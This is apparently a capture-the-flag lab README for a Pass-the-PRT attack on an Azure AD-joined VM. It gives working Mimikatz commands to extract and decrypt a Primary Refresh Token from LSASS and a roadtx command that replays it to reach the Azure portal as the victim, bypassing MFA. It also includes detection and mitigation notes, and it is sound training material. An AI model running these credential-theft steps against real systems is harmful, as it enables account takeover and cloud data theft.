# pass_the_prt — Pass-the-PRT: Lateral Movement to the Cloud

**Category:** Identity / PRT Abuse / MFA Bypass

## Scenario

A Windows Server VM is Azure AD-joined. A corporate user (`ptp-victim-*`) routinely signs in to this workstation with their Azure AD credentials, which causes Windows to cache a **Primary Refresh Token (PRT)** in LSASS. The PRT is a long-lived SSO credential — equivalent to a Kerberos TGT for the cloud — that Azure AD accepts to issue tokens for any Microsoft resource, including the Key Vault where the flag lives.

You have compromised the machine and hold local admin rights. The victim user has already logged on (step 1 below simulates this). Your goal is to extract the PRT and its session key, then sign in to the Azure portal as the victim, without any password or MFA prompt. The tokens you obtain carry the victim's device identity and the authentication strength of their original sign-in.

## Background: what is a PRT?

A PRT is issued by Azure AD's CloudAP (Cloud Authentication Provider) plugin when a user signs in on an Azure AD-joined device. It is stored in LSASS alongside an encrypted **ProofOfPossession (PoP) key** (session key protected by the device's DPAPI/TPM). Together they allow the device to mint short-lived browser cookies and access tokens without prompting the user for credentials again.

Tokens issued from a PRT carry the device ID and the authentication methods (`amr`) of the sign-in that created the PRT. If the user completed MFA, the attacker inherits that MFA claim. Conditional Access conditions based on the device, such as a device filter, are also satisfied, because the request appears to come from the victim's device. An attacker who extracts the PRT and its session key can replay them from any machine.

On a device with a TPM, the session key is bound to the TPM and cannot be exported, so the attacker must act from the device itself. This lab VM has no vTPM (no Trusted Launch), so the key is only DPAPI-protected and Mimikatz can decrypt it.

## Prerequisites

> ⚠️ **Security Defaults must be disabled** in your Entra ID tenant before deploying this lab. Security Defaults enforce MFA on Azure management, including the Azure portal, which blocks the portal sign-in even with a valid PRT (the lab's PRT carries no MFA claim).
>
> **Azure portal → Entra ID → Properties → Manage security defaults → Disabled**

## Deploy

```shell
cnimbus azure create --app-id pass_the_prt
```

## Attack Walkthrough

> **Note:** Wait ~10 minutes after `cnimbus azure create` completes. The deployment schedules a reboot that triggers an autologon session as the victim Azure AD user — this seeds their PRT into LSASS. `dsregcmd /status` in your RDP session will show `AzureAdPrt: NO` (it only reflects the current local user); use Mimikatz `sekurlsa::cloudap` to see the victim's entry.

> **Restarts remove the PRT.** The PRT only exists while the victim's session is in LSASS, and the autologon runs once. The VM deallocates nightly at 23:59 UTC, so after any stop or restart: start the VM, re-run `cnimbus azure create --app-id pass_the_prt` (every apply re-seeds the victim session and reboots the VM), then wait ~10 minutes again. For a live event or demo, deploy on the day and confirm `sekurlsa::cloudap` shows the victim's PRT beforehand.

### Step 1 — Connect as the local admin (attacker)

```shell
xfreerdp3 /v:<vm_public_ip> /u:attacker /p:<attacker_password> /d:. /cert:ignore
```

### Step 2 — Extract the PRT from LSASS

Open a command prompt **as Administrator** and launch Mimikatz:

```
C:\Tools\mimikatz\x64\mimikatz.exe
```

```
privilege::debug
sekurlsa::cloudap
```

You will see a credential entry for the victim Azure AD user. Copy two values:
- **PRT** — the base64-encoded token
- **ProofOfPossessionKey** — the encrypted session key blob

> `dsregcmd /status` shows `AzureAdPrt: NO` because it reflects the current (local admin) session, not LSASS contents. Ignore it.

### Step 3 — Decrypt the session key

Still in Mimikatz, elevate to SYSTEM context to access the machine's DPAPI master key, then decrypt:

```
token::elevate
dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect
```

Copy the **Clear key**, the raw DPAPI-decrypted session key. The output also shows a Context and a Derived Key, which you do not need.

> **Important:** use the `Clear key`, not the `Derived Key`. roadtx fails to authenticate with the Derived Key (AADSTS500061).

### Step 4 — Sign in to the Azure portal as the victim

On your attacking machine, install [roadtx](https://github.com/dirkjanm/ROADtools) (`pip install roadtx`), Firefox and [geckodriver](https://github.com/mozilla/geckodriver/releases). roadtx drives the browser through Selenium.

```shell
roadtx browserprtauth \
  --prt <PRT> \
  --prt-sessionkey <Clear_key> \
  --url https://portal.azure.com
```

A browser window opens, already signed in as the victim, with no password or MFA prompt. roadtx requests a fresh nonce from Entra ID and signs it with the session key, exactly as the victim's device would.

> If roadtx cannot find the driver, pass its location with `--driver-path`. Run `roadtx browserprtauth -h` for the options of your roadtx version.

### Step 5 — Read the flag from Key Vault

In the portal, still signed in as the victim:

1. Search for **Key vaults** and open `<keyvault_name>`
2. **Objects** → **Secrets** → `flag`
3. Click the current version → **Show Secret Value**

The victim holds **Reader** on the vault (so it appears in the portal) and **Key Vault Secrets User** (so the secret value can be shown). The attacker's local account has neither.

### Step 6 — Submit the flag

```shell
cnimbus azure validate --app-id pass_the_prt --flag "CUMULONIMBUS{...}"
```

## Why MFA does not help

A PRT does not create MFA; it carries forward what the original sign-in proved. Tokens issued from it contain:

- the **device ID** of the Entra-joined device the PRT was issued on, and
- the **authentication methods** (`amr`) used when the user signed in to that device.

So the attacker inherits two things, without any prompt:

1. **The MFA claim**, if the user completed MFA (or Windows Hello for Business) at sign-in. Policies that require MFA are then satisfied.
2. **The device identity.** Conditional Access conditions that look at the device, such as a device filter allowing only corporate device IDs, see the victim's device rather than the attacker's machine.

What the PRT does **not** give is a device state the device never had. "Require device to be marked as compliant" depends on Intune (MDM) compliance, and an Entra join alone does not satisfy it. This lab VM is not MDM-enrolled (`mdmId` is empty).

### Lab vs real world: MFA claims

In this lab the victim signs in through an automated autologon (password only), so the PRT carries `amr: ["pwd"]` with no MFA claim. This is why **Security Defaults blocks ARM access**: it requires the `mfa` claim, which this PRT does not have.

In a real environment, users sign in interactively with MFA or Windows Hello for Business, and their PRT carries that claim (`amr` includes `mfa`). An attacker who steals that PRT can then reach resources protected by MFA-only policies with no MFA prompt. That is the real impact of the technique.

To demonstrate the device-claim angle in this lab, disable Security Defaults and use a Conditional Access policy with a **device filter** that blocks the Key Vault or Azure management unless the request comes from the lab VM's device ID (requires Entra ID P1). Signing in with only a password from your own machine is blocked; the stolen PRT replayed from that same machine passes. Test the policy before relying on it in a demo.

### Defensive notes

- **Detection:** the victim's sign-ins in the Entra sign-in logs show the lab VM's device ID together with the attacker's IP address and client.
- **Mitigation:** TPM-backed devices (the session key cannot be exported), LSA protection or Credential Guard to protect LSASS, no standing local admin rights, and Conditional Access token protection where supported.

## Teardown

```shell
cnimbus azure destroy --app-id pass_the_prt
```

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| [T1550.001](https://attack.mitre.org/techniques/T1550/001/) | Use Alternate Authentication Material: Application Access Token | Defense Evasion |
| [T1078.004](https://attack.mitre.org/techniques/T1078/004/) | Valid Accounts: Cloud Accounts | Defense Evasion |
| [T1528](https://attack.mitre.org/techniques/T1528/) | Steal Application Access Token | Credential Access |
